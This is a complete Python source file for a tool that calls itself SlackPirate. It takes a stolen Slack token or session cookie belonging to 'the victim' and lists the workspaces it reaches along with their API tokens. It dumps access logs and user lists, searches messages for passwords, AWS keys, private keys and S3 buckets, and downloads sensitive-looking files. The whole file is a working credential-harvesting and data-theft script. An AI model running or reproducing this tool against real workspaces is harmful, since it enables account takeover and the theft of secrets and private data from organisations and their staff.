#!/usr/bin/env python3

import argparse
import json
import pathlib
import random
import re
import time
import colorama
import requests
import termcolor

colorama.init()  # Initialise the colorama module - this is used to print colourful messages - life's too dull otherwise

parser = argparse.ArgumentParser()
parser.add_argument('--token', type=str, required=False, help='Slack Workspace token - will start with XOX - this will allow you to query against a single Workspace')
parser.add_argument('--cookie', type=str, required=False, help='Slack \'d\' cookie - this will allow you to see all Workspaces the victim has access to')
args = parser.parse_args()

if args.cookie is None and args.token is None:
    print(termcolor.colored("No arguments passed. Run SlackPirate.py --help ", "red"))
    exit()
elif args.cookie and args.token:
    print(termcolor.colored("You cannot use both --cookie and --token flags at the same time", "red"))
    exit()
elif args.cookie and args.token is None:
    d_cookie = dict(d=args.cookie)
elif args.token and args.cookie is None:
    token = args.token

slack_workspace = ''
output_directory = ''
file_user_list = "user-list.json"
file_access_logs = "access-logs.json"
file_s3 = "s3.txt"
file_credentials = "credentials.txt"
file_aws = "aws-keys.txt"
file_private_keys = "private-keys.txt"
tier_2_rate_limit_counter = 1  # keeping track of number of requests so that we rate-limit before Slack does it for us

s3_queries = ["s3.amazonaws.com", "s3://", "https://s3", "http://s3"]
credentials_queries = ["password:", "password is"]
aws_keys_queries = ["ASIA", "AKIA"]
private_keys_queries = ["BEGIN RSA PRIVATE", "BEGIN OPENSSH PRIVATE", "BEGIN DSA PRIVATE", "BEGIN EC PRIVATE",
                        "BEGIN PGP PRIVATE"]
interesting_files_queries = [".KEY", ".PEM", ".PPK", ".XLS", ".XLSX", ".DOC", ".DOCX", ".SH", ".SQL", "password",
                             "secret"]
already_signed_in_team_regex = r"already_signed_in_team\" href=\"([a-zA-Z0-9:./-]+)"  # https://regex101.com/r/9GRaem/1
slack_api_token_regex = r"api_token: \"(xox[a-zA-Z]-[a-zA-Z0-9-]+)\""  # https://regex101.com/r/2Hz8AX/1
workspace_valid_emails_regex = r"email-domains-formatted=\"(@.+?)[\"]"
private_keys_regex = r"[-]+BEGIN [^\s]+ PRIVATE KEY[-]+[\s]*[^-]*[-]+END [^\s]+ PRIVATE KEY[-]+"  # https://regex101.com/r/jWrF8F/1
s3_regex = r"[a-zA-Z0-9-\.\_]+\.s3\.amazonaws\.com|s3://[a-zA-Z0-9-\.\_]+|s3-[a-zA-Z0-9-\.\_\/]+|s3.amazonaws.com/[a-zA-Z0-9-\.\_]+|s3.console.aws.amazon.com/s3/buckets/[a-zA-Z0-9-\.\_]+"  # https://regex101.com/r/6bLaKj/7
credentials_regex = r"[pP]assword\s*:\s*[^\s]+|password is\s*:\s*[^\s]+|password is\s*\"[^\s]+"  # https://regex101.com/r/xQz9JT/3
aws_keys_regex = r"(?<![A-Za-z0-9/+=])[A-Za-z0-9/+=]{40}(?![A-Za-z0-9/+=])|(?<![A-Z0-9])[A-Z0-9]{20}(?![A-Z0-9])"  # https://regex101.com/r/IEq5nU/2


def is_cookie_flag_set():
    if args.cookie:
        try:
            r = requests.get("https://a.slack.com", cookies=d_cookie)
            regex_results = re.findall(already_signed_in_team_regex, str(r.content))
            if regex_results:
                print(termcolor.colored("This cookie has access to the following Workspaces: \n", "blue"))
                for workspace in regex_results:
                    r = requests.get(workspace, cookies=d_cookie)
                    regex_tokens = re.findall(slack_api_token_regex, str(r.content))
                    for slack_token in regex_tokens:
                        print(termcolor.colored("URL: " + workspace + " Token: " + slack_token, "green"))

            else:
                print(termcolor.colored("No workspaces were found for this cookie", "red"))
                exit()
        except requests.exceptions.RequestException as exception:
            print(exception)
        exit()


def check_token_validity():
    global output_directory
    global slack_workspace
    try:
        r = requests.post(
            "https://slack.com/api/auth.test?token=" + token + "&pretty=1",
            headers={'Authorization': 'Bearer ' + token}).json()
        if str(r['ok']) == 'True':
            output_directory = str(r['team']) + ".slack.com"
            slack_workspace = str(r['url'])
            print(termcolor.colored("Token looks valid! URL: " + str(r['url']) + " User: " + str(r['user']), "green"))
            pathlib.Path(output_directory).mkdir(parents=True,
                                                 exist_ok=True)  # create files directory to keep things tidy
        else:
            print(termcolor.colored("Token not valid - maybe it's expired? Slack error: " + str(r['error']), "red"))
            exit()
    except requests.exceptions.RequestException as exception:
        print(exception)


def print_interesting_information():
    try:
        r = requests.get(slack_workspace)
        team_domains_match = re.findall(workspace_valid_emails_regex, str(r.content))
        for domain in team_domains_match:
            print(termcolor.colored("The following domains can be used on this Slack Workspace: " + domain, "green"))
    except requests.exceptions.RequestException as exception:
        print(exception)


def dump_team_access_logs():
    try:
        r = requests.get(
            "https://slack.com/api/team.accessLogs?token=" + token + "&pretty=1&count=1000").json()
        if str(r['ok']) == 'True':
            for value in r['logins']:
                with open(output_directory + '/' + file_access_logs, 'a') as outfile:
                    json.dump(value, outfile, indent=4, sort_keys=True, ensure_ascii=False)
        else:
            print(termcolor.colored("Unable to dump access logs. Slack error: " + str(r['error']), "yellow"))
            return
    except requests.exceptions.RequestException as exception:
        print(exception)
    print(termcolor.colored("Successfully dumped access logs! Filename: ./" + output_directory + "/" + file_access_logs,
                            "blue"))


def dump_user_list():
    pagination_cursor = ''  # virtual pagination - apparently this is what the cool kids do these days :-)
    try:
        r = requests.get(
            "https://slack.com/api/users.list?token=" + token + "&pretty=1&limit=1&cursor=" + pagination_cursor).json()
        if str(r['ok']) == 'False':
            print(termcolor.colored("Unable to dump the user list. Slack error: " + str(r['error']), "yellow"))
        else:
            pagination_cursor = r['response_metadata']['next_cursor']
            while str(r['ok']) == 'True' and pagination_cursor:
                r = requests.get(
                    "https://slack.com/api/users.list?token=" + token + "&pretty=1&limit=900&cursor=" + pagination_cursor).json()
                for value in r['members']:
                    pagination_cursor = r['response_metadata']['next_cursor']
                    with open(output_directory + '/' + file_user_list, 'a') as outfile:
                        json.dump(value, outfile, indent=4, sort_keys=True, ensure_ascii=False)
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "red"))
    print(termcolor.colored("Successfully dumped user list! Filename: ./" + output_directory + "/" + file_user_list,
                            "blue"))


def find_s3():
    global tier_2_rate_limit_counter
    page = 1
    pagination = {}

    try:
        for query in s3_queries:
            r = requests.get(
                "https://slack.com/api/search.messages?token=" + token + "&query=\"" + query + "\"""&pretty=1&count=100").json()
            pagination[query] = (r['messages']['pagination']['page_count'])

        for key, value in pagination.items():
            while page <= value:
                if tier_2_rate_limit_counter % 20 == 0:  # using modulo arithmetic to stay under Slack rate limit which is 20/minute (https://api.slack.com/docs/rate-limits#tier_t2)
                    print(
                        termcolor.colored("Sleeping for 70 seconds so we don't hit the Slack API rate limit!", "blue"))
                    time.sleep(70)
                r = requests.get(
                    "https://slack.com/api/search.messages?token=" + token + "&query=\"" + key + "\"""&pretty=1&count=100&page=" + str(
                        page)).json()
                regex_results = re.findall(s3_regex, str(r))
                with open(output_directory + '/' + file_s3, 'a') as log_output:
                    for item in set(regex_results):
                        log_output.write(item + "\n")
                tier_2_rate_limit_counter += 1
                page += 1
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "red"))
    print(termcolor.colored("If any S3 buckets were found, they will be here: ./" + output_directory + "/" + file_s3,
                            "blue"))


def find_credentials():
    global tier_2_rate_limit_counter
    page = 1
    pagination = {}

    try:
        for query in credentials_queries:
            r = requests.get(
                "https://slack.com/api/search.messages?token=" + token + "&query=\"" + query + "\"""&pretty=1&count=100").json()
            pagination[query] = (r['messages']['pagination']['page_count'])

        for key, value in pagination.items():
            while page <= value:
                if tier_2_rate_limit_counter % 20 == 0:  # using modulo arithmetic to stay under Slack rate limit which is 20/minute (https://api.slack.com/docs/rate-limits#tier_t2)
                    print(
                        termcolor.colored("Sleeping for 70 seconds so we don't hit the Slack API rate limit!", "blue"))
                    time.sleep(70)
                r = requests.get(
                    "https://slack.com/api/search.messages?token=" + token + "&query=\"" + key + "\"""&pretty=1&count=100&page=" + str(
                        page)).json()
                regex_results = re.findall(credentials_regex, str(r))
                with open(output_directory + '/' + file_credentials, 'a') as log_output:
                    for item in set(regex_results):
                        log_output.write(item + "\n")
                tier_2_rate_limit_counter += 1
                page += 1
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "red"))
    print(termcolor.colored(
        "If any credentials were found, they will be here: ./" + output_directory + "/" + file_credentials, "blue"))


def find_aws_keys():
    global tier_2_rate_limit_counter
    page = 1
    pagination = {}

    try:
        for query in aws_keys_queries:
            r = requests.get(
                "https://slack.com/api/search.messages?token=" + token + "&query=\"" + query + "\"""&pretty=1&count=100").json()
            pagination[query] = (r['messages']['pagination']['page_count'])

        for key, value in pagination.items():
            while page <= value:
                if tier_2_rate_limit_counter % 20 == 0:  # using modulo arithmetic to stay under Slack rate limit which is 20/minute (https://api.slack.com/docs/rate-limits#tier_t2)
                    print(
                        termcolor.colored("Sleeping for 70 seconds so we don't hit the Slack API rate limit!", "blue"))
                    time.sleep(70)
                r = requests.get(
                    "https://slack.com/api/search.messages?token=" + token + "&query=\"" + key + "\"""&pretty=1&count=100&page=" + str(
                        page)).json()
                regex_results = re.findall(aws_keys_regex, str(r))
                with open(output_directory + '/' + file_aws, 'a') as log_output:
                    for item in set(regex_results):
                        log_output.write(item + "\n")
                tier_2_rate_limit_counter += 1
                page += 1
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "red"))
    print(termcolor.colored("If any AWS keys were found, they will be here: ./" + output_directory + "/" + file_aws,
                            "blue"))


def find_private_keys():
    global tier_2_rate_limit_counter
    page = 1
    pagination = {}

    try:
        for query in private_keys_queries:
            r = requests.get(
                "https://slack.com/api/search.messages?token=" + token + "&query=\"" + query + "\"""&pretty=1&count=100").json()
            pagination[query] = (r['messages']['pagination']['page_count'])

        for key, value in pagination.items():
            while page <= value:
                if tier_2_rate_limit_counter % 20 == 0:  # using modulo arithmetic to stay under Slack rate limit which is 20/minute (https://api.slack.com/docs/rate-limits#tier_t2)
                    print(
                        termcolor.colored("Sleeping for 70 seconds so we don't hit the Slack API rate limit!", "blue"))
                    time.sleep(70)
                r = requests.get(
                    "https://slack.com/api/search.messages?token=" + token + "&query=\"" + key + "\"""&pretty=1&count=100&page=" + str(
                        page)).json()
                regex_results = re.findall(private_keys_regex, str(r))
                with open(output_directory + '/' + file_private_keys, 'a') as log_output:
                    for item in set(regex_results):
                        log_output.write(item + "\n")
                tier_2_rate_limit_counter += 1
                page += 1
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "red"))
    print(termcolor.colored(
        "If any private keys were found, they will be here: ./" + output_directory + "/" + file_private_keys, "blue"))


def download_interesting_files():
    pathlib.Path(output_directory + '/downloads').mkdir(parents=True,
                                                        exist_ok=True)  # create files directory to keep things tidy
    bad_characters = "/\\:*?\"<>|"  # Windows doesn't like these characters. Guess how I found out.
    strip_bad_characters = str.maketrans(bad_characters, '_________')  # Replace bad characters with an underscore
    global tier_2_rate_limit_counter
    page = 1
    pagination = {}

    try:
        for query in interesting_files_queries:
            r = requests.get(
                "https://slack.com/api/search.files?token=" + token + "&query=\"" + query + "\"""&pretty=1&count=100").json()
            pagination[query] = (r['files']['pagination']['page_count'])

        for key, value in pagination.items():
            while page <= value:
                if tier_2_rate_limit_counter % 20 == 0:  # using modulo arithmetic to stay under Slack rate limit which is 20/minute (https://api.slack.com/docs/rate-limits#tier_t2)
                    print(
                        termcolor.colored("Sleeping for 70 seconds so we don't hit the Slack API rate limit!", "blue"))
                    time.sleep(70)
                r = requests.get(
                    "https://slack.com/api/search.files?token=" + token + "&query=\"" + key + "\"""&pretty=1&count=100&page=" + str(
                        page)).json()
                for file in r['files']['matches']:
                    file_name = file['name']
                    r = requests.get(file['url_private'], headers={'Authorization': 'Bearer ' + token})
                    open(output_directory + '/downloads/' + str(random.randint(0, 999)) + ' ' + file_name.translate(
                        strip_bad_characters), 'wb').write(r.content)
                tier_2_rate_limit_counter += 1
                page += 1
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "red"))
    print(
        termcolor.colored("Downloaded files (if any were found) will be found in: ./" + output_directory + "/downloads",
                          "blue"))


is_cookie_flag_set()

check_token_validity()

print_interesting_information()

dump_team_access_logs()

dump_user_list()

find_s3()

find_credentials()

find_aws_keys()

find_private_keys()

download_interesting_files()
